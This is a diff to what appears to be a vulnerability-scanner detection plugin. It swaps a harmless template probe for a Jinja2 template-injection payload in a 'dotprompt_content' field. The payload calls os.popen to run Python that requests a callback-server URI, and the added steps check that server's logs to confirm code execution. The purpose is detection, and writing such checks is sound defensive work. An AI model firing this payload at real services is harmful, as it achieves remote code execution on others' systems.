@@ -60,16 +60,18 @@ actions: {
         value: "application/json"
       }
     ]
-    data: "{\"dotprompt_content\":\"---\\nmodel: gpt-3.5-turbo\\n---\\n{{ \\\"\\\".__class__ }}\"}"
-    response: {
-      http_status: 200
-      expect_all: {
-        conditions: [
-          { body: {} contains: "chatcmpl-" }
-        ]
-      }
-    }
+    data: "{\"dotprompt_content\": \"---\\nmodel: gpt-3.5-turbo\\n---\\n{{ lipsum.__globals__['os'].popen('python3 -c \\\"import requests;requests.get(\\\\\'{{ T_CBS_URI }}\\\\\')\\\"').read() }}\"}"
   }
+}
+
+actions: {
+  name: "sleep"
+  utility: { sleep: { duration_ms: 5000 } }
+}
+
+actions: {
+  name: "check_callback_server_logs"
+  callback_server: { action_type: CHECK }
 }
 
 #############
